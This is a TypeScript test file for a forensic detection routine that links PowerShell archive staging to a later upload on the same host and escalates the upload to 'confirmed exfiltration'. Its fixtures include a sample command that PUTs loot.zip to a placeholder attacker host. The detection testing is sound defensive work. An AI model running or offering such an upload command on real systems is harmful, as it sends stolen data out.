import { describe, it, expect } from "vitest";
import { linkArchiveToExfil } from "../../src/analysis/exfilCorrelate.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

const stage = (id: string, ts: string, asset = "FS-01"): ForensicEvent => ({
  id, timestamp: ts, asset,
  description: "Sysmon Process create (EID 1) - powershell.exe -c Compress-Archive -Path D:\\ClientData\\Tax2023",
  severity: "Medium", mitreTechniques: ["T1059", "T1560.001"], relatedFindingIds: [], sourceScreenshots: [], sources: ["Sysmon"],
});
const upload = (id: string, ts: string, asset = "FS-01", severity: ForensicEvent["severity"] = "Medium"): ForensicEvent => ({
  id, timestamp: ts, asset,
  description: "Sysmon Process create (EID 1) - powershell.exe -c Invoke-RestMethod -Uri https://mft.attacker.tld/u -Method Put -InFile loot.zip",
  severity, mitreTechniques: ["T1059", "T1041"], relatedFindingIds: [], sourceScreenshots: [], sources: ["Sysmon"],
});

describe("linkArchiveToExfil", () => {
  it("raises a same-host upload following archive staging to High and tags it", () => {
    const out = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z"),
      upload("u1", "2024-03-12T17:00:21Z"),
    ]);
    const u = out.find((e) => e.id === "u1")!;
    expect(u.severity).toBe("High");
    expect(u.description).toContain("confirmed exfiltration");
    expect(u.description).toContain("FS-01");
    // staging event itself is untouched
    expect(out.find((e) => e.id === "s1")!.severity).toBe("Medium");
  });

  it("does NOT raise an upload on a DIFFERENT host from the staging", () => {
    const out = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z", "FS-01"),
      upload("u1", "2024-03-12T17:00:21Z", "WS-05"),
    ]);
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium");
  });

  it("does NOT raise an upload BEFORE the staging (wrong order)", () => {
    const out = linkArchiveToExfil([
      upload("u1", "2024-03-12T10:00:00Z"),
      stage("s1", "2024-03-12T16:15:02Z"),
    ]);
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium");
  });

  it("does NOT raise an upload far outside the default window", () => {
    const out = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z"),
      upload("u1", "2024-03-20T16:15:02Z"), // 8 days later
    ]);
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium");
  });

  it("honors a custom windowMinutes", () => {
    const out = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:00:00Z"),
      upload("u1", "2024-03-12T16:30:00Z"), // 30 min later
    ], { windowMinutes: 15 });
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium"); // outside a 15-min window
  });

  it("never demotes an already-Critical upload, and is idempotent on re-run", () => {
    const once = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z"),
      upload("u1", "2024-03-12T17:00:21Z", "FS-01", "Critical"),
    ]);
    expect(once.find((e) => e.id === "u1")!.severity).toBe("Critical");
    const twice = linkArchiveToExfil(once);
    const u = twice.find((e) => e.id === "u1")!;
    expect(u.severity).toBe("Critical");
    expect((u.description.match(/confirmed exfiltration/g) ?? []).length).toBe(1); // marker not duplicated
  });

  it("leaves events with no staging or no upload tag untouched", () => {
    const plain = (id: string): ForensicEvent => ({
      id, timestamp: "2024-03-12T12:00:00Z", asset: "FS-01", description: "benign",
      severity: "Low", mitreTechniques: [], relatedFindingIds: [], sourceScreenshots: [],
    });
    const out = linkArchiveToExfil([plain("p1"), plain("p2")]);
    expect(out).toEqual([plain("p1"), plain("p2")]);
  });
});
